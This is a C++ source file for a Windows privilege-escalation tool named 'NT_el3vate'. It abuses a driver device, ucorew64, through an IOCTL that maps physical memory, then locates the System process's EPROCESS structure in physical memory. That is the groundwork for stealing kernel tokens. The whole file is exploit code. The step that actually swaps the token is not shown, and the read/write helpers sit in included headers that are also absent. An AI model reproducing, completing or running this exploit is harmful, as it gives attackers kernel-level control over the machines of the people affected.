#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <vector>

#include "rw_primitive.h"
#include "windows_helper_functions.h"



void printBytes(void* ptr, int size)
{
	unsigned char* p = (unsigned char*)ptr;
	for (int i = 0; i < size; i++) {
		printf("%02hhX ", p[i]);
	}
	printf("\n");
}

int main(int argc, char** argv)
{
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;

	DWORD bytesReturned = 0;

	SetConsoleTitleA("NT_el3vate");

	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
		return FALSE;
	}
	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
	if (hPhysicalMemory == NULL) {
		fprintf(stderr, "calloc() failed");
		return FALSE;
	}
	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory),
		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		return EXIT_FAILURE;
	}
	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);

	unsigned __int64 eproc = GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory);
	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
	printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)eproc);

	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
	CloseHandle(device);
	return EXIT_SUCCESS;
}